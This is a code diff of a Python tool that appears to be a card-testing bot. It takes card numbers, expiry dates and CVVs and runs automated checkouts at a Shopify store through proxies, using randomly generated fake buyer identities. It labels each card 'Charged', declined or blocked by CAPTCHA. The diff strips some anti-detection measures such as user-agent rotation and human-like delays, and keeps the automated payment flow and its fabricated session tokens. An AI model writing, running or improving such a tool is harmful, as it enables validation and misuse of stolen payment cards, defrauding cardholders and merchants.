@@ -163,8 +163,7 @@ class ShopifyLogger:
             "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
             "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓",
             "PROXY": "🔧", "NO_PROXY": "🚫", "PCI": "💳",
-            "CHECKOUT_TOKEN": "🎫", "PROCESSING": "⏳",
-            "BOT_DETECTED": "🤖", "CLOUDFLARE": "☁️", "RATE_LIMIT": "⏱️"
+            "CHECKOUT_TOKEN": "🎫", "PROCESSING": "⏳"
         }
         error_icon = error_icons.get(error_type, "⚠️")
         log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
@@ -324,7 +323,7 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             response_display = "PROXY_DEAD"
         elif "NO_PROXY_AVAILABLE" in raw_response:
             response_display = "NO_PROXY_AVAILABLE"
-        elif "CAPTCHA" in raw_response.upper() or "BOT_DETECTED" in raw_response.upper() or "CLOUDFLARE" in raw_response.upper():
+        elif "CAPTCHA" in raw_response.upper():
             response_display = "CAPTCHA"
         elif "3D" in raw_response.upper() or "3DS" in raw_response.upper():
             response_display = "3D_SECURE"
@@ -342,10 +341,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             response_display = "PAYMENT_AMOUNT_ERROR"
         elif "PROCESSING_TIMEOUT" in raw_response:
             response_display = "PROCESSING_TIMEOUT"
-        elif "RATE_LIMIT" in raw_response.upper() or "TOO_MANY_REQUESTS" in raw_response.upper():
-            response_display = "RATE_LIMIT"
-        elif "HTML_RESPONSE" in raw_response.upper() or "BOT_PROTECTION" in raw_response.upper():
-            response_display = "BOT_PROTECTION"
         else:
             # Take first part before colon or first 30 characters
             if ":" in raw_response:
@@ -370,14 +365,13 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
         ]):
             status_flag = "Charged ✅"
-        # Check for CAPTCHA/Bot Protection
+        # Check for CAPTCHA
         elif any(keyword in raw_response_upper for keyword in [
             "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
             "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
             "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
             "HCAPTCHA", "CLOUDFLARE", "ENTER PAYMENT INFORMATION AND SOLVE",
-            "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY", "BOT_PROTECTION",
-            "ACCESS DENIED", "403 FORBIDDEN", "RATE_LIMIT", "TOO_MANY_REQUESTS"
+            "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
         ]):
             status_flag = "Captcha ⚠️"
         # Check for PAYMENT ERROR
@@ -491,7 +485,6 @@ class ShopifyMiddleEasternCheckout:
 
         # Session for maintaining cookies
         self.client = None
-        self.cookies = {}
 
         # Base headers from captured traffic
         self.headers = {
@@ -534,30 +527,24 @@ class ShopifyMiddleEasternCheckout:
 
         self.logger = ShopifyLogger(user_id)
 
-        # Random data generators with more variety
+        # Random data generators
         self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
                            "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
                            "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
                            "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey",
                            "Casey", "Mini", "Bruce", "Tony", "Steve", "Peter", "Clark", "Randua",
-                           "Ahley", "Ashley", "Jessica", "Sarah", "Emily", "Lisa", "Michelle", "Mallika",
-                           "Christopher", "Brandon", "Justin", "Ryan", "Nicholas", "Tyler", "Zachary"]
-        
+                           "Ahley", "Ashley", "Jessica", "Sarah", "Emily", "Lisa", "Michelle", "Mallika"]
         self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
                           "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
                           "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
                           "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Lang", 
-                          "Trump", "Walker", "Hall", "Allen", "Young", "King", "Baby", "Wright",
-                          "Scott", "Green", "Adams", "Baker", "Nelson", "Carter", "Mitchell", "Perez"]
+                          "Trump", "Walker", "Hall", "Allen", "Young", "King", "Baby"]
 
         self.first_name = random.choice(self.first_names)
         self.last_name = random.choice(self.last_names)
         self.full_name = f"{self.first_name} {self.last_name}"
-        
-        # Use different email domains to avoid pattern detection
-        email_domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com", "protonmail.com"]
-        self.email = f"{self.first_name.lower()}.{self.last_name.lower()}{random.randint(10,9999)}@{random.choice(email_domains)}"
-        self.phone = f"{random.choice(['212', '310', '415', '515', '617', '718', '773', '818', '909'])}{random.randint(100, 999)}{random.randint(1000, 9999)}"
+        self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@hotmail.com"
+        self.phone = f"515{random.randint(100, 999)}{random.randint(1000, 9999)}"
 
         # Fixed address based on captured data (Middle Eastern Market pickup location)
         self.address = {
@@ -575,14 +562,9 @@ class ShopifyMiddleEasternCheckout:
             "longitude": -87.8076595
         }
 
-    async def random_delay(self, min_sec=0.5, max_sec=1.5):
-        """More realistic delays between requests"""
-        # Add some variation to avoid pattern detection
-        delay = random.uniform(min_sec, max_sec)
-        # Occasionally add a longer delay to appear more human
-        if random.random() < 0.1:  # 10% chance
-            delay += random.uniform(1.0, 2.0)
-        await asyncio.sleep(delay)
+    async def random_delay(self, min_sec=0.3, max_sec=0.7):
+        """Minimal delay between requests"""
+        await asyncio.sleep(random.uniform(min_sec, max_sec))
 
     def step(self, num, name, action, details=None, status="PROCESSING"):
         return self.logger.step(num, name, action, details, status)
@@ -633,63 +615,25 @@ class ShopifyMiddleEasternCheckout:
         timestamp = self.generate_timestamp()
         return f"{self.checkout_token}-{timestamp}"
 
-    async def check_for_bot_protection(self, response_text, url=""):
-        """Check if response contains bot protection indicators"""
-        bot_indicators = [
-            'captcha', 'hcaptcha', 'recaptcha', 'cloudflare',
-            'access denied', '403 forbidden', 'too many requests',
-            'rate limit', 'bot detected', 'human verification',
-            'please verify', 'security check', 'just a moment',
-            'checking your browser', 'cf-browser-verification'
-        ]
-        
-        response_lower = response_text.lower()
-        for indicator in bot_indicators:
-            if indicator in response_lower:
-                self.logger.error_log("BOT_DETECTED", f"Bot protection detected: {indicator}", url)
-                return True, indicator
-        
-        return False, None
-
     async def get_product_page(self):
         """Step 1: Get product page to get initial cookies"""
         self.step(1, "GET PRODUCT PAGE", f"Loading El Mordjene Vanille product page")
         
         try:
-            # Rotate user agent occasionally
-            if random.random() < 0.3:  # 30% chance to change user agent
-                user_agents = [
-                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
-                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
-                ]
-                self.headers['user-agent'] = random.choice(user_agents)
-            
             resp = await self.client.get(self.product_url, headers=self.headers, timeout=15, follow_redirects=True)
             
-            # Check for bot protection
-            is_bot, indicator = await self.check_for_bot_protection(resp.text, self.product_url)
-            if is_bot:
-                return False, f"BOT_PROTECTION_{indicator.upper().replace(' ', '_')}"
-            
             if resp.status_code != 200:
-                if resp.status_code in [403, 429]:
-                    return False, "BOT_PROTECTION_RATE_LIMIT"
                 self.logger.error_log("PRODUCT_PAGE", f"Failed: {resp.status_code}")
                 return False, f"Failed to load product page: {resp.status_code}"
             
-            # Store cookies
-            self.cookies.update(dict(resp.cookies))
-            self.logger.data_extracted("Cookies", f"{len(self.cookies)} cookies set", "Response headers")
+            # Extract cookies from response
+            self.logger.data_extracted("Cookies", "Session cookies set", "Response headers")
             
             return True, resp.text
             
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on product page: {str(e)}")
-            if self.proxy_url:
-                mark_proxy_failed(self.proxy_url)
+            mark_proxy_failed(self.proxy_url)
             self.proxy_status = "Dead 🚫"
             return False, "PROXY_DEAD"
         except httpx.TimeoutException as e:
@@ -726,14 +670,7 @@ class ShopifyMiddleEasternCheckout:
                 follow_redirects=True
             )
             
-            # Check for bot protection
-            is_bot, indicator = await self.check_for_bot_protection(resp.text, f"{self.base_url}/cart/add.js")
-            if is_bot:
-                return False, f"BOT_PROTECTION_{indicator.upper().replace(' ', '_')}"
-            
             if resp.status_code != 200:
-                if resp.status_code in [403, 429]:
-                    return False, "BOT_PROTECTION_RATE_LIMIT"
                 return False, f"Add to cart failed: {resp.status_code}"
             
             self.logger.data_extracted("Cart", "1 x El Mordjene Vanille added", "Success")
@@ -741,8 +678,7 @@ class ShopifyMiddleEasternCheckout:
             
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on add to cart: {str(e)}")
-            if self.proxy_url:
-                mark_proxy_failed(self.proxy_url)
+            mark_proxy_failed(self.proxy_url)
             self.proxy_status = "Dead 🚫"
             return False, "PROXY_DEAD"
         except httpx.TimeoutException as e:
@@ -771,11 +707,6 @@ class ShopifyMiddleEasternCheckout:
                 timeout=15
             )
             
-            # Check for bot protection
-            is_bot, indicator = await self.check_for_bot_protection(cart_response.text, f"{self.base_url}/cart")
-            if is_bot:
-                return False, f"BOT_PROTECTION_{indicator.upper().replace(' ', '_')}"
-            
             # Now proceed to checkout
             checkout_url = f"{self.base_url}/checkout"
             
@@ -786,11 +717,6 @@ class ShopifyMiddleEasternCheckout:
                 timeout=20
             )
             
-            # Check for bot protection again
-            is_bot, indicator = await self.check_for_bot_protection(resp.text, checkout_url)
-            if is_bot:
-                return False, f"BOT_PROTECTION_{indicator.upper().replace(' ', '_')}"
-            
             # Get final URL from redirects which contains the checkout token
             current_url = str(resp.url)
             self.checkout_token = self.extract_checkout_token(current_url)
@@ -800,19 +726,6 @@ class ShopifyMiddleEasternCheckout:
                 body_token = self.extract_checkout_token(resp.text)
                 if body_token:
                     self.checkout_token = body_token
-                else:
-                    # Try to find in HTML meta tags or scripts
-                    token_patterns = [
-                        r'checkout_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-                        r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-                        r'checkout%5Btoken%5D=([^&\s"\']+)',
-                        r'"token":"([^"]+)"'
-                    ]
-                    for pattern in token_patterns:
-                        match = re.search(pattern, resp.text)
-                        if match:
-                            self.checkout_token = match.group(1)
-                            break
             
             if self.checkout_token:
                 self.logger.data_extracted("Checkout Token", self.checkout_token, "Checkout URL")
@@ -823,16 +736,12 @@ class ShopifyMiddleEasternCheckout:
                 
                 return True, current_url
             else:
-                # Check if we got a non-checkout page (maybe bot protection)
-                if "captcha" in resp.text.lower() or "cloudflare" in resp.text.lower():
-                    return False, "BOT_PROTECTION_CAPTCHA"
                 self.logger.error_log("CHECKOUT_TOKEN", "No token found in response")
                 return False, "CHECKOUT_TOKEN_ERROR"
                 
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on checkout: {str(e)}")
-            if self.proxy_url:
-                mark_proxy_failed(self.proxy_url)
+            mark_proxy_failed(self.proxy_url)
             self.proxy_status = "Dead 🚫"
             return False, "PROXY_DEAD"
         except httpx.TimeoutException as e:
@@ -862,46 +771,19 @@ class ShopifyMiddleEasternCheckout:
                 follow_redirects=True
             )
             
-            # Check for bot protection
-            is_bot, indicator = await self.check_for_bot_protection(resp.text, checkout_page_url)
-            if is_bot:
-                return False, f"BOT_PROTECTION_{indicator.upper().replace(' ', '_')}"
-            
             if resp.status_code != 200:
-                if resp.status_code in [403, 429]:
-                    return False, "BOT_PROTECTION_RATE_LIMIT"
                 return False, f"Checkout page failed: {resp.status_code}"
             
             # Extract session token from response or generate based on pattern
-            # Try to find actual session token in response
-            token_patterns = [
-                r'session_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-                r'x-checkout-one-session-token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-                r'"sessionToken":"([^"]+)"',
-                r'"oneSessionToken":"([^"]+)"'
-            ]
-            
-            found_token = None
-            for pattern in token_patterns:
-                match = re.search(pattern, resp.text)
-                if match:
-                    found_token = match.group(1)
-                    break
-            
-            if found_token:
-                self.session_token = found_token
-            else:
-                # Generate token based on pattern from captured traffic
-                self.session_token = f"AAEB_{self.generate_random_string(50)}"
-            
+            # In captured traffic, this is a long token starting with AAEB_
+            self.session_token = f"AAEB_{self.generate_random_string(50)}"
             self.logger.data_extracted("Session Token", self.session_token[:20] + "...", "Checkout page")
             
             return True, resp.text
             
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on checkout page: {str(e)}")
-            if self.proxy_url:
-                mark_proxy_failed(self.proxy_url)
+            mark_proxy_failed(self.proxy_url)
             self.proxy_status = "Dead 🚫"
             return False, "PROXY_DEAD"
         except httpx.TimeoutException as e:
@@ -932,8 +814,7 @@ class ShopifyMiddleEasternCheckout:
             'sec-fetch-site': 'same-origin',
             'shopify-checkout-client': 'checkout-web/1.0',
             'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
-            'user-agent': self.headers['user-agent'],
-            'x-requested-with': 'XMLHttpRequest'
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
         }
         
         if self.session_token:
@@ -1072,17 +953,7 @@ class ShopifyMiddleEasternCheckout:
                 timeout=15
             )
             
-            # Check if response is JSON or HTML (bot protection)
-            content_type = resp.headers.get('content-type', '')
-            if 'text/html' in content_type:
-                is_bot, indicator = await self.check_for_bot_protection(resp.text, graphql_url)
-                if is_bot:
-                    return False, f"BOT_PROTECTION_{indicator.upper().replace(' ', '_')}"
-                return False, "BOT_PROTECTION_HTML_RESPONSE"
-            
             if resp.status_code != 200:
-                if resp.status_code in [403, 429]:
-                    return False, "BOT_PROTECTION_RATE_LIMIT"
                 return False, f"Proposal failed: {resp.status_code}"
             
             try:
@@ -1123,16 +994,12 @@ class ShopifyMiddleEasternCheckout:
                 
                 return True, "PROPOSAL_SUCCESS"
                 
-            except json.JSONDecodeError as e:
-                # Check if the response is actually HTML (bot protection)
-                if '<html' in resp.text.lower() or '<!doctype html' in resp.text.lower():
-                    return False, "BOT_PROTECTION_HTML_RESPONSE"
+            except Exception as e:
                 return False, f"Failed to parse proposal response: {str(e)[:50]}"
                 
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on proposal: {str(e)}")
-            if self.proxy_url:
-                mark_proxy_failed(self.proxy_url)
+            mark_proxy_failed(self.proxy_url)
             self.proxy_status = "Dead 🚫"
             return False, "PROXY_DEAD"
         except httpx.TimeoutException as e:
@@ -1163,8 +1030,7 @@ class ShopifyMiddleEasternCheckout:
             'sec-fetch-site': 'same-origin',
             'shopify-checkout-client': 'checkout-web/1.0',
             'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
-            'user-agent': self.headers['user-agent'],
-            'x-requested-with': 'XMLHttpRequest',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
             'x-checkout-one-session-token': self.session_token
         }
         
@@ -1294,30 +1160,11 @@ class ShopifyMiddleEasternCheckout:
                 timeout=15
             )
             
-            # Check if response is JSON or HTML
-            content_type = resp.headers.get('content-type', '')
-            if 'text/html' in content_type:
-                is_bot, indicator = await self.check_for_bot_protection(resp.text, graphql_url)
-                if is_bot:
-                    return False, f"BOT_PROTECTION_{indicator.upper().replace(' ', '_')}"
-                return False, "BOT_PROTECTION_HTML_RESPONSE"
-            
             if resp.status_code != 200:
-                if resp.status_code in [403, 429]:
-                    return False, "BOT_PROTECTION_RATE_LIMIT"
                 return False, f"Pickup selection failed: {resp.status_code}"
             
             try:
                 pickup_resp = resp.json()
-                
-                # Check for errors
-                if 'errors' in pickup_resp and pickup_resp['errors']:
-                    error_msgs = [error.get('code', 'UNKNOWN') for error in pickup_resp['errors']]
-                    # If these are expected validation errors, continue
-                    if any(code in ['PAYMENTS_FIRST_NAME_REQUIRED', 'PAYMENTS_LAST_NAME_REQUIRED'] for code in error_msgs):
-                        pass
-                    else:
-                        return False, f"DECLINED - {', '.join(error_msgs)}"
                 
                 # Extract new queue token
                 data = pickup_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
@@ -1327,20 +1174,12 @@ class ShopifyMiddleEasternCheckout:
                 
                 return True, "PICKUP_SELECTED"
                 
-            except json.JSONDecodeError as e:
-                if '<html' in resp.text.lower():
-                    return False, "BOT_PROTECTION_HTML_RESPONSE"
+            except Exception as e:
                 return False, f"Failed to parse pickup response: {str(e)[:50]}"
                 
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on pickup selection: {str(e)}")
-            if self.proxy_url:
-                mark_proxy_failed(self.proxy_url)
-            self.proxy_status = "Dead 🚫"
             return False, "PROXY_DEAD"
-        except httpx.TimeoutException as e:
-            self.logger.error_log("TIMEOUT", f"Timeout on pickup selection: {str(e)}")
-            return False, "TIMEOUT"
         except Exception as e:
             self.logger.error_log("PICKUP_SELECTION", str(e))
             return False, f"Pickup selection error: {str(e)[:50]}"
@@ -1363,7 +1202,7 @@ class ShopifyMiddleEasternCheckout:
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-storage-access': 'active',
-            'user-agent': self.headers['user-agent']
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
         }
         
         # Generate shopify-identification-signature (similar to captured)
@@ -1402,7 +1241,7 @@ class ShopifyMiddleEasternCheckout:
         
         try:
             # Use separate client for PCI
-            async with httpx.AsyncClient(proxy=self.proxy_url, timeout=15, follow_redirects=True) as pci_client:
+            async with httpx.AsyncClient(proxy=self.proxy_url, timeout=15) as pci_client:
                 resp = await pci_client.post(
                     'https://checkout.pci.shopifyinc.com/sessions',
                     headers=pci_headers,
@@ -1410,17 +1249,7 @@ class ShopifyMiddleEasternCheckout:
                     timeout=15
                 )
                 
-                # Check for bot protection
-                content_type = resp.headers.get('content-type', '')
-                if 'text/html' in content_type:
-                    is_bot, indicator = await self.check_for_bot_protection(resp.text, 'https://checkout.pci.shopifyinc.com/sessions')
-                    if is_bot:
-                        return False, f"BOT_PROTECTION_{indicator.upper().replace(' ', '_')}"
-                    return False, "BOT_PROTECTION_HTML_RESPONSE"
-                
                 if resp.status_code != 200:
-                    if resp.status_code in [403, 429]:
-                        return False, "BOT_PROTECTION_RATE_LIMIT"
                     return False, f"PCI session creation failed: {resp.status_code}"
                 
                 try:
@@ -1432,15 +1261,12 @@ class ShopifyMiddleEasternCheckout:
                     self.logger.data_extracted("Payment Session ID", payment_session_id, "PCI")
                     return True, payment_session_id
                     
-                except json.JSONDecodeError as e:
-                    if '<html' in resp.text.lower():
-                        return False, "BOT_PROTECTION_HTML_RESPONSE"
+                except Exception as e:
                     return False, f"Failed to parse PCI response: {str(e)[:50]}"
                     
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on PCI: {str(e)}")
-            if self.proxy_url:
-                mark_proxy_failed(self.proxy_url)
+            mark_proxy_failed(self.proxy_url)
             self.proxy_status = "Dead 🚫"
             return False, "PROXY_DEAD"
         except httpx.TimeoutException as e:
@@ -1471,8 +1297,7 @@ class ShopifyMiddleEasternCheckout:
             'sec-fetch-site': 'same-origin',
             'shopify-checkout-client': 'checkout-web/1.0',
             'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
-            'user-agent': self.headers['user-agent'],
-            'x-requested-with': 'XMLHttpRequest',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
             'x-checkout-one-session-token': self.session_token
         }
         
@@ -1648,30 +1473,11 @@ class ShopifyMiddleEasternCheckout:
                 timeout=15
             )
             
-            # Check for bot protection
-            content_type = resp.headers.get('content-type', '')
-            if 'text/html' in content_type:
-                is_bot, indicator = await self.check_for_bot_protection(resp.text, graphql_url)
-                if is_bot:
-                    return False, f"BOT_PROTECTION_{indicator.upper().replace(' ', '_')}"
-                return False, "BOT_PROTECTION_HTML_RESPONSE"
-            
             if resp.status_code != 200:
-                if resp.status_code in [403, 429]:
-                    return False, "BOT_PROTECTION_RATE_LIMIT"
                 return False, f"Billing update failed: {resp.status_code}"
             
             try:
                 billing_resp = resp.json()
-                
-                # Check for errors
-                if 'errors' in billing_resp and billing_resp['errors']:
-                    error_msgs = [error.get('code', 'UNKNOWN') for error in billing_resp['errors']]
-                    # If these are expected validation errors, continue
-                    if any(code in ['PAYMENTS_FIRST_NAME_REQUIRED', 'PAYMENTS_LAST_NAME_REQUIRED'] for code in error_msgs):
-                        pass
-                    else:
-                        return False, f"DECLINED - {', '.join(error_msgs)}"
                 
                 # Extract new queue token
                 data = billing_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
@@ -1681,20 +1487,12 @@ class ShopifyMiddleEasternCheckout:
                 
                 return True, "BILLING_UPDATED"
                 
-            except json.JSONDecodeError as e:
-                if '<html' in resp.text.lower():
-                    return False, "BOT_PROTECTION_HTML_RESPONSE"
+            except Exception as e:
                 return False, f"Failed to parse billing response: {str(e)[:50]}"
                 
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on billing update: {str(e)}")
-            if self.proxy_url:
-                mark_proxy_failed(self.proxy_url)
-            self.proxy_status = "Dead 🚫"
             return False, "PROXY_DEAD"
-        except httpx.TimeoutException as e:
-            self.logger.error_log("TIMEOUT", f"Timeout on billing update: {str(e)}")
-            return False, "TIMEOUT"
         except Exception as e:
             self.logger.error_log("BILLING_UPDATE", str(e))
             return False, f"Billing update error: {str(e)[:50]}"
@@ -1720,8 +1518,7 @@ class ShopifyMiddleEasternCheckout:
             'sec-fetch-site': 'same-origin',
             'shopify-checkout-client': 'checkout-web/1.0',
             'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
-            'user-agent': self.headers['user-agent'],
-            'x-requested-with': 'XMLHttpRequest',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
             'x-checkout-one-session-token': self.session_token
         }
         
@@ -1908,17 +1705,7 @@ class ShopifyMiddleEasternCheckout:
                 timeout=20
             )
             
-            # Check for bot protection
-            content_type = resp.headers.get('content-type', '')
-            if 'text/html' in content_type:
-                is_bot, indicator = await self.check_for_bot_protection(resp.text, graphql_url)
-                if is_bot:
-                    return False, f"BOT_PROTECTION_{indicator.upper().replace(' ', '_')}"
-                return False, "BOT_PROTECTION_HTML_RESPONSE"
-            
             if resp.status_code != 200:
-                if resp.status_code in [403, 429]:
-                    return False, "BOT_PROTECTION_RATE_LIMIT"
                 return False, f"Submit failed: {resp.status_code}"
             
             try:
@@ -1929,28 +1716,8 @@ class ShopifyMiddleEasternCheckout:
                     error_msgs = []
                     for error in submit_resp['errors']:
                         error_code = error.get('code', 'UNKNOWN')
-                        # Map Shopify error codes to readable messages
-                        if error_code == 'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT':
-                            return False, "DECLINED - PAYMENT_AMOUNT_ERROR"
-                        elif error_code == 'PAYMENTS_CALL_ISSUER':
-                            return False, "DECLINED - CALL_ISSUER"
-                        elif error_code == 'PAYMENTS_INSUFFICIENT_FUNDS':
-                            return False, "DECLINED - INSUFFICIENT_FUNDS"
-                        elif error_code == 'PAYMENTS_INVALID_CARD':
-                            return False, "DECLINED - INVALID_CARD"
-                        elif error_code == 'PAYMENTS_CARD_DECLINED':
-                            return False, "DECLINED - CARD_DECLINED"
-                        elif error_code == 'PAYMENTS_EXPIRED_CARD':
-                            return False, "DECLINED - EXPIRED_CARD"
-                        elif error_code == 'PAYMENTS_INCORRECT_CVC':
-                            return False, "DECLINED - INCORRECT_CVV"
-                        elif error_code == 'PAYMENTS_FRAUD':
-                            return False, "DECLINED - FRAUD_SUSPECTED"
-                        else:
-                            error_msgs.append(error_code)
-                    
-                    if error_msgs:
-                        return False, f"DECLINED - {', '.join(error_msgs)}"
+                        error_msgs.append(error_code)
+                    return False, f"DECLINED - {', '.join(error_msgs)}"
                 
                 data = submit_resp.get('data', {}).get('submitForCompletion', {})
                 receipt = data.get('receipt', {})
@@ -1981,15 +1748,12 @@ class ShopifyMiddleEasternCheckout:
                 else:
                     return False, f"Unknown receipt type: {receipt_type}"
                     
-            except json.JSONDecodeError as e:
-                if '<html' in resp.text.lower():
-                    return False, "BOT_PROTECTION_HTML_RESPONSE"
+            except Exception as e:
                 return False, f"Failed to parse submit response: {str(e)[:50]}"
                 
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on submit: {str(e)}")
-            if self.proxy_url:
-                mark_proxy_failed(self.proxy_url)
+            mark_proxy_failed(self.proxy_url)
             self.proxy_status = "Dead 🚫"
             return False, "PROXY_DEAD"
         except httpx.TimeoutException as e:
@@ -2027,13 +1791,6 @@ class ShopifyMiddleEasternCheckout:
                     params=poll_params,
                     timeout=25
                 )
-                
-                # Check for bot protection
-                content_type = resp.headers.get('content-type', '')
-                if 'text/html' in content_type:
-                    is_bot, indicator = await self.check_for_bot_protection(resp.text, graphql_url)
-                    if is_bot:
-                        return False, f"BOT_PROTECTION_{indicator.upper().replace(' ', '_')}"
                 
                 if resp.status_code != 200:
                     # Try POST if GET fails
@@ -2091,7 +1848,7 @@ class ShopifyMiddleEasternCheckout:
                             continue
                         return False, f"Unknown receipt status: {receipt_type}"
                         
-                except json.JSONDecodeError as e:
+                except Exception as e:
                     if poll_attempts < max_attempts:
                         self.logger.step(10, "POLL RECEIPT RETRY", f"Parse error, retrying...", str(e)[:50], "WAIT")
                         await asyncio.sleep(base_delay)
@@ -2135,99 +1892,62 @@ class ShopifyMiddleEasternCheckout:
                 self.proxy_status = "No Proxy"
                 self.client = httpx.AsyncClient(timeout=20, follow_redirects=True)
             
-            # Add small initial delay to appear more human
-            await asyncio.sleep(random.uniform(0.5, 1.0))
-            
             # Step 1: Get product page
             success, result = await self.get_product_page()
             if not success:
-                # Check if it's a bot protection error
-                if "BOT_PROTECTION" in result:
-                    return False, result
                 return False, result
-            await self.random_delay(0.5, 1.0)
+            await self.random_delay(0.3, 0.5)
             
             # Step 2: Add to cart
             success, result = await self.add_to_cart()
             if not success:
-                if "BOT_PROTECTION" in result:
-                    return False, result
                 return False, result
-            await self.random_delay(0.5, 1.0)
+            await self.random_delay(0.3, 0.5)
             
             # Step 3: Proceed to checkout
             success, result = await self.proceed_to_checkout()
             if not success:
-                if "BOT_PROTECTION" in result:
-                    return False, result
                 return False, result
-            await self.random_delay(0.5, 1.0)
+            await self.random_delay(0.3, 0.5)
             
             # Step 4: Get checkout page
             success, result = await self.get_checkout_page()
             if not success:
-                if "BOT_PROTECTION" in result:
-                    return False, result
                 return False, result
-            await self.random_delay(0.5, 1.0)
+            await self.random_delay(0.3, 0.5)
             
             # Step 5: Submit initial proposal with email
             success, result = await self.submit_initial_proposal()
             if not success:
-                if "BOT_PROTECTION" in result:
-                    return False, result
                 return False, result
-            await self.random_delay(0.5, 1.0)
+            await self.random_delay(0.3, 0.5)
             
             # Step 6: Select pickup delivery
             success, result = await self.select_pickup_delivery()
             if not success:
-                if "BOT_PROTECTION" in result:
-                    return False, result
                 return False, result
-            await self.random_delay(0.5, 1.0)
+            await self.random_delay(0.3, 0.5)
             
             # Step 7: Create payment session
             success, payment_session_id = await self.create_payment_session(cc, mes, ano, cvv)
             if not success:
-                if "BOT_PROTECTION" in payment_session_id:
-                    return False, payment_session_id
                 return False, payment_session_id
-            await self.random_delay(0.5, 1.0)
+            await self.random_delay(0.3, 0.5)
             
             # Step 8: Update billing address
             success, result = await self.update_billing_address(payment_session_id)
             if not success:
-                if "BOT_PROTECTION" in result:
-                    return False, result
                 return False, result
-            await self.random_delay(0.5, 1.0)
+            await self.random_delay(0.3, 0.5)
             
             # Step 9: Submit for completion
             success, result = await self.submit_for_completion(payment_session_id)
             
             return success, result
             
-        except httpx.HTTPStatusError as e:
-            if e.response.status_code in [403, 429]:
-                self.logger.error_log("BOT_DETECTED", f"HTTP {e.response.status_code} - Rate limited or blocked")
-                return False, "BOT_PROTECTION_RATE_LIMIT"
-            return False, f"HTTP Error: {e.response.status_code}"
-        except httpx.ConnectError as e:
-            self.logger.error_log("CONNECTION", f"Connection error: {str(e)}")
-            return False, "CONNECTION_ERROR"
         except Exception as e:
             self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
-            # Categorize the error for better response
-            error_str = str(e).lower()
-            if "captcha" in error_str or "cloudflare" in error_str or "bot" in error_str:
-                return False, "BOT_PROTECTION_DETECTED"
-            elif "timeout" in error_str:
